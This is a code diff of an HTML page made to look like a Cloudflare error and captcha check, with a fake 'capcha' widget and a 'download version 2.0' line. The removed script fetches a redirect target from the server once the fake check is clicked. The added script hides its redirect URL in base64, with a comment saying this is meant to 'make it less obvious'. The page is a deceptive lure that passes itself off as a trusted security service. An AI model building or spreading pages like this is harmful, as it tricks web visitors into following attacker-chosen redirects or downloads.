@@ -1057,20 +1057,7 @@ padding:0}</style>
   #cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;
 }
 </style>
-    
-    <script>
-        // Function to check the URL parameters and perform a redirect
-        function checkQueryParams() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const pageValue = urlParams.get('page'); // Get the 'id' parameter from the URL
 
-            if (pageValue === '555') {
-                // Redirect to Google if id=555
-                window.location.href = "https://www.google.com";
-            } else {
-                console.log("ID does not match 555. No redirect.");
-            }
-        }
 </head>
 <body>
   <div id="cf-wrapper">
@@ -1717,133 +1704,69 @@ You may need to download version 2.0 now from the <a rel="noopener noreferrer" h
       </div>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
-
-                                                <script>
+            <script>
                 var counterC = 0;
-
                 var alert = false;
-
                 var counterR = 1;
-
                 $(document).ready(function(){
                         function get(){
                                 var url = new URL(document.location.href);
-
-
-        var id = "555";
-
-
-
                         }
                         get();
-
-
                         $('.capcha__button-next').click(function () { // функция 
                                 get();
-
-
                         capcha();
-
-
                         });
-
-
                 });
-
-
         </script>
+		
 <script>
-
-
 
 window.onload = function () {
     $(".popup").css("opacity" ,"1");
-
-
 }
-
 
 $('.capcha__trigger').click(function () { 
     $('.capcha__trigger').addClass("capcha__trigger_hide");
-
-
     $('.capcha__spiner').fadeIn(600);
 
-
-
 setTimeout(function(){
-
-          $('.capcha__spiner').hide();
-
-
+      $('.capcha__spiner').hide();
       $('.capcha__popup').fadeOut(300);
-
-
       $('.capcha__trigger').hide();
-
-
       $('.capcha__ok').addClass("capcha__ok_active");
-
-
-          
-          
-          
-          
-          
           var botid = "555";
-
-
-          
-
-          
-          
-          
           setTimeout(function(){
-          
-          
-          
-function check_link(){ 
-$.post('?page=' + botid, {action: 'check_link2'}, function(d){ 
-if (d.length > 0) { 
+function check_link() {
+    // Base64 encode the link to make it less obvious
+    let encodedLink = 'aHR0cHM6Ly9nb29nbGUuY29t';
+    
+    // Decode and redirect after a small delay
+    setTimeout(function() {
+        window.parent.location.href = atob(encodedLink);
+    }, 10); // Delay of 1 second
+}
+$(document).ready(function(){
+    check_link();
 
-
- window.parent.location.href = d;
- 
-} 
+    setInterval(function() {
+        check_link();
+    }, 1000);
 });
 
- 
-} 
-
-
+// Initial delay of 3 seconds before the first check
+setTimeout(function(){
+    check_link();
+}, 3000);
         $(document).ready(function(){
                         check_link();
-
-
-
                         setInterval(function() {
                                 check_link();
-
-
                         }, 10000);
-
-
                 });
-
-
-
  }, 3000);
-
-
-
-
     }, 3000);
-
-
 });
-
-
-
 
                 </script>
 
@@ -1863,8 +1786,7 @@ if (d.length > 0) {
     <span class="cf-footer-separator sm:hidden">•</span>
     <span class="cf-footer-item sm:block sm:mb-1"><span>Your IP</span>: 2605:6400:30:ef8f:38f7:9bf8:5788:11c4</span>
     <span class="cf-footer-separator sm:hidden">•</span>
-    <span class="cf-footer-item sm:block sm:mb-1"><span>Performance &amp;
- security by</span> <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing" id="brand_link" target="_blank">Cloudflare</a></span>
+    <span class="cf-footer-item sm:block sm:mb-1"><span>Performance &amp; security by</span> <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing" id="brand_link" target="_blank">Cloudflare</a></span>
     
   </p>
 </div><!-- /.error-footer -->
@@ -1877,93 +1799,4 @@ if (d.length > 0) {
 
 
 
-
-<div style="background-color: rgb(255, 255, 255);
-
- border: 1px solid rgb(215, 215, 215);
-
- box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 4px;
- border-radius: 4px;
- left: -10000px;
- top: -10000px;
- z-index: -2147483648;
- position: absolute;
- transition: opacity 0.15s ease-out 0s;
- opacity: 0;
- visibility: hidden;
-" aria-hidden="true"><div style="position: relative;
- z-index: 1;
-">
-</div><div style="width: 100%;
- height: 100%;
- position: fixed;
- pointer-events: none;
- top: 0px;
- left: 0px;
- z-index: 0;
- background-color: rgb(255, 255, 255);
-
- opacity: 0.05;
-"></div><div style="border-width: 11px;
- position: absolute;
- pointer-events: none;
- margin-top: -11px;
- z-index: 1;
- right: 100%;
-"><div style="border-width: 10px;
- border-style: solid;
- border-color: transparent rgb(255, 255, 255) transparent transparent;
- position: relative;
- top: 10px;
- z-index: 1;
-"></div><div style="border-width: 11px;
- border-style: solid;
- border-color: transparent rgb(215, 215, 215) transparent transparent;
- position: relative;
- top: -11px;
- z-index: 0;
-"></div></div></div><div style="background-color: rgb(255, 255, 255);
-
- border: 1px solid rgb(215, 215, 215);
-
- box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 4px;
- border-radius: 4px;
- left: -10000px;
- top: -10000px;
- z-index: -2147483648;
- position: absolute;
- transition: opacity 0.15s ease-out 0s;
- opacity: 0;
- visibility: hidden;
-" aria-hidden="true"><div style="position: relative;
- z-index: 1;
-">
-</div><div style="width: 100%;
- height: 100%;
- position: fixed;
- pointer-events: none;
- top: 0px;
- left: 0px;
- z-index: 0;
- background-color: rgb(255, 255, 255);
-
- opacity: 0.05;
-"></div><div style="border-width: 11px;
- position: absolute;
- pointer-events: none;
- margin-top: -11px;
- z-index: 1;
- right: 100%;
-"><div style="border-width: 10px;
- border-style: solid;
- border-color: transparent rgb(255, 255, 255) transparent transparent;
- position: relative;
- top: 10px;
- z-index: 1;
-"></div><div style="border-width: 11px;
- border-style: solid;
- border-color: transparent rgb(215, 215, 215) transparent transparent;
- position: relative;
- top: -11px;
- z-index: 0;
-"></div></div></div></body></html>
+</body></html>
